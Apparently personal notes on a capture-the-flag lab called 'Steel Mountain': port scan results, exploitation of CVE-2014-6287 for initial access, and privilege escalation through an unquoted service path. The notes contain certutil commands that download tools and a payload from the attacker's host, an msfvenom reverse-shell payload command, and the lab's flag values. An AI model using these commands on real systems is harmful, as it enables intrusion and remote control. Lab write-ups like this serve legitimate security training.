```
Steel Mountain - 10.10.67.106
```

#Ports Open - 80,135,139,445,3389,8080

#Detail of Ports
>80
>135
>139
>445
>3389
>8080

#Findings + Exploitation
>server on port 8080 is vuln to rce

##Metsploit Version
>couldnt get it working using metasploit but imp things i found in writeups
>PowerUp script

##Non-Metasploit Version
>searching for the exploit for the server we found
>found a cve 2014-6287
>acc to the instructions, started a server w 'nc.exe' file available
>started a nc listener
>changed ip and port
>exploit worked and got 'user.txt'
	b04763b6fcf51fcd7c13abc7db4fd365

##Priv Esc.
>tried systeminfo to get information about the system
>found it as x64 bit system
>used x64 bit winpeas
>sent to target using certutil
	certutil.exe -urlcache -split -f http://10.17.4.195/winpeas.exe
>ran winpeas using
	cmd /c 'winpeas cmd fast'
						OR
	winpeas.exe
>found AdvancedSystemCareServices9 runnning
>found a exploit for it
	IObit Advanced SystemCare 10.0.2 - Unquoted Service Path Privilege Escalation
>acc to the exploit, stop the service first
	sc stop AdvancedSystemCareService9
>then make a payload Advanced.exe with msfvenom
	msfvenom -p windows/shell_reverse_tcp LHOST=10.17.4.195 LPORT=4444 -f exe -o Advanced.exe
>change the directory to the location of the previous exe
	cd C:\Program Files (x86)\IObit
>now send it using the same certutil method
	certutil.exe -urlcache -split -f http://10.17.4.195/Advanced.exe
>once ready, start the service again after setting up a listener
	sc start AdvancedSystemCareService9
>and got a shell back
>we are ROOT!!!
	9af5f314f57607c00fd09803a587db80